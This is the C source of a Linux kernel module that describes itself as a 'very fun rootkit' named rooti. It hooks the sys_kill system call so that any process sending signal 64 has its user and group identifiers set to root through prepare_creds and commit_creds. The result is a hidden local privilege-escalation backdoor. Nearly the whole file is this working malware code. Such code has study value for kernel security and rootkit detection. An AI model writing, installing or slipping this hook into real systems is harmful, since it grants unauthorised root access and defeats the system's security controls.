#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include "hook.c"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

// Unused signal number, used to request a privilege escalation to root
#define ROOTI_SIG_PE 64

static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

static int elevate_privilege(void)
{
    // Prepare new set of credentials
    struct cred *creds = prepare_creds();
    if (creds == NULL) {
        printk(KERN_DEBUG "rooti: prepare_creds() failed.\n");
        return -ENOMEM;
    }

    // Elevate identifiers to those of user & group root
    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    // Commit new set of credentials in the context of the process in execution
    commit_creds(creds);

    return 0;
}

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    if (sig == ROOTI_SIG_PE) {
        return elevate_privilege();
    }
    return orig_kill(regs);
}

// List of system calls to hook :D
struct rooti_syscall_hook hooks[] = {
    ROOTI_HOOK("sys_kill", hook_kill, &orig_kill)
};


/* LKM initialization */
static int __init rooti_init(void)
{
    printk(KERN_INFO "rooti: init\n");
    
    int ret = rooti_hooking_init();
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_hooking_init() failed: %d\n", ret);
        return ret;
    }

    // Install hooks :D
    ret = rooti_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
        return ret;
    }

    return 0;
}

/* LKM cleanup */
static void __exit rooti_exit(void)
{
    printk(KERN_INFO "rooti: exit\n");
    rooti_uninstall_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rooti_init);
module_exit(rooti_exit);
